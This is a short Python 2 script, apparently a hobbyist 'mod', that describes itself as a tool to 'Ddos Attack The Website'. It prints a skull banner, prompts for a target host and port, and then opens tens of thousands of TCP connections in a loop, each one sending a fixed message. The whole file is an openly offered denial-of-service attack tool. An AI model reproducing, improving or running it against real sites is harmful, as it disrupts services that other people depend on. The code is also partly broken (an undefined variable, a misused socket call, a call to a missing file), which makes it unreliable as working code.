#!/usr/bin/python
# Virus
# Mod by The Sixty Nine
# Github: github.com/thesixtynine/Virus

import os, sys, time, string, socket

def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
    curdir = os.getcwd()

def write(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

os.system('clear')
os.system('reset')
time.sleep(1)

logo = """\033[1;77m                  ...
                ;::::;
              ;::::; :;
            ;:::::'   :;
           ;:::::;     ;.
          ,:::::'       ;           OOO0
          ::::::;       ;          OOOOO00
          ;:::::;       ;         OOOOOOOO00
         ,;::::::;     ;'        /  /OOOOOOO0
       ;:::::::::`. ,,,;.       /  /  /DOOOOOO
     .';:::::::::::::::::;,    /  /      /DOOOO
    ,::::::;::::::;;;;::::;,  /  /         /DOOO
   ;`::::::`'::::::;;;::::: ,/  /           /DOOO
   :`:::::::`;::::::;;::: ;::: /             /DOOO
   ::`:::::::`;:::::::: ;:::::/               /DOO
   `:`:::::::`;:::::: ;:::::::                DOO
    :::`:::::::`;; ;:::::::::::               OO
    ::::`:::::::`;::::::::;::::              OO
    `:::::`::::::::::::;'`:;:::             O
     `:::::`::::::::;'/  /`::
      ::::::`:::::;' /  /  `:
"""
print (logo)

print ("\033[0m[\033[94;1m#\033[0m] Ddos Attack The Website")
print ("\033[0m[\033[93;1m*\033[0m] Mod by The Sixty Nine")
print ("\033[0m[\033[96;1m&\033[0m] My Github @thesixtynine")
time.sleep(1)
print

host = raw_input("\033[0m[\033[95;1m+\033[0m] \033[77;1mInput Web: \033[0m")
port = raw_input("\033[0m[\033[93;1m+\033[0m] \033[77;1mInput Port: \033[0m")
connect=50000
ip = socket.gethostbyname( host )
print
print ("\033[0m[\033[94;1m*\033[0m] Attacking \033[1;77m[" + host + "]")
time.sleep(3)
print ("\033[0m[\033[92;1m*\033[0m] Attack to ip \033[1;77m["+ ip + "]")
time.sleep(3)
message=("NO SYSTEM IS SAFE")
print
write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
print
time.sleep(3)
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("\033[0m[\033[91;1m!\033[0m] \033[77;1mNo connection to \033[0m [" + ip + "]")
    write ( "\033[0mSent [=\033[0;1;91m UFO \033[0m=] success to [\033[0;1;2;96m" + ip + "\033[0m]")

    ddos.close()
for i in range(1, connect):
    dos()
print("\033[0m[\033[91;1m!\033[0m] \033[77;1mDenial of Sevice is failed ...")
if __name__ == "__main__":
    answer = raw_input(" \033[0m[\033[96;1m?\033[0m] \033[1;77mNext to Denial of Service: ")
    if answer.strip() in "y Y fire Fire FIRE".split():
        restart_program()
    else:
        os.system(curdir+"Deqmain.py")
